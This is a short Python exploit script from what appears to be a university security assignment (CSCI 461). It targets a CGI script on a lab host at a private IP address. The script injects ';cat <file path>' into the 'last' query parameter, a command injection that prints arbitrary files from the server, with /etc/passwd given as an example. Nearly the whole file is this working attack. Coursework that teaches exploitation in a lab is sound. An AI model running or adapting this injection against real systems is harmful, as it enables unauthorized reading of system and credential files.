#!/usr/bin/env python3

#Garrett Gregory
#CSCI 461
#Assignment 2

#Prints the contents of a user-specified file that can be accessed from the point
#of the exploit. If the file cannot be accessed, the output will be blank.

import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 hw2exploit.py target_file_path")
    print("Should be full file path, starting with / and ending with the filename.")
    #example: python3 hw2exploit.py /usr/ctf/museum/html/cgi-bin/museum_search.pl
    #example: python3 hw2exploit.py /etc/passwd

else:
    filePath = sys.argv[1]
    #shell code to be executed
    shellKode = ";cat "+filePath
    #the variable kk was not initialized in the .php file. set its value to shell code and execute.
    r = requests.get("http://192.168.56.2:8001/cgi-bin/museum_admin.pl", params={'first':"hot dog", 'last':shellKode})
    #trim off html code from text, then print the contents of the user-specified file
    results = r.text[252:-130]
    print(results)
